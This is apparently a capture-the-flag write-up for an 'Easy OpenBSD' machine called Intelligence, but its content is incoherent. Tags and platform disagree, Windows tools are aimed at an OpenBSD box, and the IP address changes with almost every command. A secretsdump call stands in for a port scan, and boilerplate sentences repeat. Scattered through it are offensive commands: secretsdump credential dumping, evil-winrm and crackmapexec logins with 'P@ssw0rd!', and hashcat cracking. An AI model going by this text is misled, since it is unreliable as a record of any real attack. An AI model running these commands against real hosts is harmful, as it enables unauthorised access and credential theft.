---
TitleSEO: "PwnTillDawn — Intelligence (Easy OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Intelligence (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Intelligence. CORS Misconfiguration and LAPS Abuse to achieve easy compromise on OpenBSD."
Keywords: "hackthebox, active directory, easy"
URL: "https://zurefx.github.io/writeups/htb-intelligence-984.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-intelligence-984/"
Date: "2024-04-26"
Tags: "HackTheBox, Active Directory, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-intelligence-984"
Permalink: "/writeups/htb-intelligence-984.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Intelligence** is rated **Easy** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.64.214.83`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.45.183
```

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.18.116.77/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.122.91.222
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.64.126.193/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
gobuster dir -u http://10.125.249.84/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
nmap -sCV -p135,443,9200 10.117.46.190 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **Remote File Inclusion**.

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.110.58.216/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
evil-winrm -i 10.40.203.2 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.20.63.163 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
gobuster dir -u http://10.29.236.107/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p389,464,464 10.87.97.11 -oN scan.txt
```

### Exploitation

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

```powershell
crackmapexec smb 10.41.28.79 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `mimikatz`
- `lookupsid`
- `rpcclient`
- `sqlmap`

### Key Takeaways

- CORS Misconfiguration
- LAPS Abuse
- Remote File Inclusion
- NTLM Relay
